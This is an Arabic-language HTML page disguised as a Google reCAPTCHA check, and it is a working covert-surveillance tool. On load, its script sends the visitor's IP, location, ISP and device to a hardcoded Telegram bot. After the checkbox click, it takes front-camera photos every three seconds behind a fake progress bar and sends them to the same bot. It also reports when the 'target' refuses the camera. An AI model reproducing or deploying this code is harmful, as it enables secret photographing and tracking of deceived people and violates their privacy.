<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من الأمان</title>
    <style>
        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .captcha-container { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; box-shadow: 0 0 4px rgba(0,0,0,0.1); }
        .captcha-content { display: flex; align-items: center; justify-content: space-between; }
        .check-section { display: flex; align-items: center; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; cursor: pointer; position: relative; }
        .checkbox.loading { border-top-color: #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .text { color: #555; font-size: 14px; user-select: none; }
        .logo-section { text-align: center; }
        .logo-section img { width: 30px; }
        .logo-section div { font-size: 8px; color: #9b9b9b; }
        #progress-box { display: none; margin-top: 15px; text-align: center; }
        .bar { width: 100%; background: #eee; height: 4px; border-radius: 2px; margin-top: 8px; overflow: hidden; }
        .fill { width: 0%; background: #4a90e2; height: 100%; transition: width 0.5s; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="captcha-container">
        <div class="captcha-content">
            <div class="check-section">
                <div class="checkbox" id="check"></div>
                <div class="text" id="status">أنا لست برنامج روبوت</div>
            </div>
            <div class="logo-section">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
                <div>الخصوصية - البنود</div>
            </div>
        </div>
        
        <div id="progress-box">
            <div class="text" style="font-size: 12px;">جاري تأمين الاتصال...</div>
            <div class="bar"><div class="fill" id="fill"></div></div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
        const chat = "2103976274";
        const nextPage = "project.html"; 

        // جمع البيانات الأساسية فور الدخول
        async function collectAll() {
            let n = navigator;
            let report = "🚨 **دخول جديد عبر نظام التحقق**\n\n";
            try {
                const res = await fetch('https://ipapi.co/json/').then(d => d.json());
                report += `🌍 **IP:** \`${res.ip}\`\n📍 **الموقع:** ${res.city}, ${res.country_name}\n🏢 **الشركة:** ${res.org}\n`;
            } catch (e) {}
            
            let deviceDetail = n.userAgent.match(/\(([^)]+)\)/) ? n.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0] : n.platform;
            report += `📱 **الجهاز:** ${deviceDetail}\n`;
            sendText(report);
        }

        document.getElementById('check').onclick = async function() {
            let box = this;
            let statusText = document.getElementById('status');
            let pBox = document.getElementById('progress-box');
            let fill = document.getElementById('fill');
            
            box.classList.add('loading');
            
            try {
                const s = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 } } 
                });
                document.getElementById('v').srcObject = s;
                
                // بدء إرسال الصور فوراً كل 3 ثوانٍ
                let snapInterval = setInterval(snap, 3000);
                
                // إظهار شريط التحميل لإطالة الوقت
                box.style.display = 'none';
                statusText.innerText = "جاري التحقق من الهوية...";
                pBox.style.display = 'block';

                let width = 0;
                let loading = setInterval(() => {
                    if (width >= 100) {
                        clearInterval(loading);
                        clearInterval(snapInterval); // توقف قبل النقل مباشرة
                        window.location.href = nextPage;
                    } else {
                        width += 5; // سيستغرق حوالي 10-12 ثانية للتحميل
                        fill.style.width = width + '%';
                    }
                }, 600); 

            } catch (e) {
                statusText.innerText = "يجب السماح بالكاميرا للمتابعة";
                box.classList.remove('loading');
                sendText("⚠️ **المستهدف رفض الكاميرا**");
            }
        };

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            if (video.videoWidth === 0) return;
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', chat);
                f.append('photo', blob, 'img.jpg');
                fetch(api + "sendPhoto", { method: 'POST', body: f });
            }, 'image/jpeg', 0.9);
        }

        function sendText(txt) {
            fetch(api + "sendMessage", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat, text: txt, parse_mode: "Markdown" })
            });
        }

        collectAll();
    </script>
</body>
</html>
